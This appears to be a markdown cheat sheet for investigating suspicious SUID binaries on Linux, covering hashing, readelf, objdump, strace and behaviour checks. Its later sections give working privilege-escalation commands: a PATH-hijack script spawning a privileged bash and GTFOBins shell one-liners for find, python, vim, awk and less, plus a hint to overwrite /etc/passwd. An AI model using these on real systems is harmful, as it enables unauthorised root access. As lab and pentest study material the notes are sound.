# Investigating Unknown Binaries
> For when you find a SUID/suspicious binary and have limited tools

---

## 1. Basic Identity

```bash
file /opt/binaryName          # type, architecture, stripped or not, 32/64bit
ls -la /opt/binaryName        # size, permissions, owner
ls -lai /opt/binaryName       # inode number — compare with known binaries
```

---

## 2. Is It Just a Known Binary in Disguise?

Compare inode — if they match, it's a hardlink (literally the same file):
```bash
ls -lai /opt/binaryName /usr/bin/find
ls -lai /opt/binaryName /usr/bin/python3
```

Compare hash — if they match, it's a copy of a known binary:
```bash
md5sum /opt/binaryName /usr/bin/find
sha256sum /opt/binaryName /usr/bin/find
```

Compare size:
```bash
ls -la /opt/binaryName /usr/bin/find
```

---

## 3. Strings — When `strings` Is Not Available

Raw cat (sometimes leaks readable text):
```bash
cat /opt/binaryName
```

Hex dump with grep for interesting patterns:
```bash
xxd /opt/binaryName | grep -a "sh\|bin\|exec\|tmp\|root\|home\|path"
```

Read-only data section (hardcoded strings, error messages, usage text):
```bash
objdump -s -j .rodata /opt/binaryName
```

All sections at once:
```bash
objdump -s /opt/binaryName | less
```

---

## 4. What Functions Does It Import?

Check symbol table for library calls — reveals what it *does* under the hood:
```bash
readelf -s /opt/binaryName
readelf -s /opt/binaryName | grep -i "FUNC"
```

Key functions to look for:

| Function | Implies |
|----------|---------|
| `system`, `execve`, `popen` | Executes shell commands |
| `opendir`, `readdir`, `nftw`, `stat` | Filesystem traversal (like `find`) |
| `fopen`, `fread`, `fwrite` | File read/write |
| `setuid`, `setgid` | Privilege manipulation |
| `socket`, `connect`, `bind` | Network activity |
| `dlopen`, `dlsym` | Dynamic library loading |

Full ELF header + all sections:
```bash
readelf -a /opt/binaryName | less
```

Dynamic dependencies (what libraries it links against):
```bash
readelf -d /opt/binaryName | grep NEEDED
ldd /opt/binaryName
```

---

## 5. Disassembly

Look for calls to dangerous functions like `system` / `execve`:
```bash
objdump -d /opt/binaryName | less
objdump -d /opt/binaryName | grep -A5 "system\|execve\|popen"
```

---

## 6. Just Run It — Observe Behaviour

```bash
/opt/binaryName
/opt/binaryName --help
/opt/binaryName -h
/opt/binaryName .
/opt/binaryName /tmp
/opt/binaryName junkarg
```

- Does it list files? → filesystem tool
- Does it recurse? → likely `find`-like
- Does it crash with a usage message? → read the message carefully
- Does it call home / open a port? → network binary

---

## 7. Watch System Calls Live

If `strace` is available:
```bash
strace /opt/binaryName 2>&1 | less
strace -e execve,openat,read /opt/binaryName 2>&1
```

If `ltrace` is available (library calls):
```bash
ltrace /opt/binaryName 2>&1
```

---

## 8. Check the Environment / Path Dependency

Does it call something relatively (without full path)?
```bash
strings /opt/binaryName 2>/dev/null | grep -v "^/" | grep -E "^[a-z]"
```
Or via objdump `.rodata` — look for bare command names like `backup`, `netstat`, `ls`.

If yes → **PATH hijacking**:
```bash
echo '/bin/bash -p' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH
/opt/binaryName
```

---

## 9. SUID — GTFOBins Candidates

Once you identify the binary, check:
- https://gtfobins.github.io

Common SUID escalations:

```bash
# find
find . -exec /bin/sh -p \; -quit

# bash
/bin/bash -p

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'

# awk
awk 'BEGIN {system("/bin/sh -p")}'

# less / more
!/bin/sh

# cp — overwrite /etc/passwd or sudoers
```

---

## 10. Quick Decision Flow

```
Found unknown SUID binary
        │
        ├── same inode/hash as known binary? → treat it as that binary → GTFOBins
        │
        ├── readelf -s shows execve/system? → likely executes commands
        │
        ├── .rodata shows bare command names? → PATH hijack candidate
        │
        ├── runs like find (traverses dirs)? → try find GTFOBin payload
        │
        └── none of above → disassemble with objdump, trace with strace
```

---
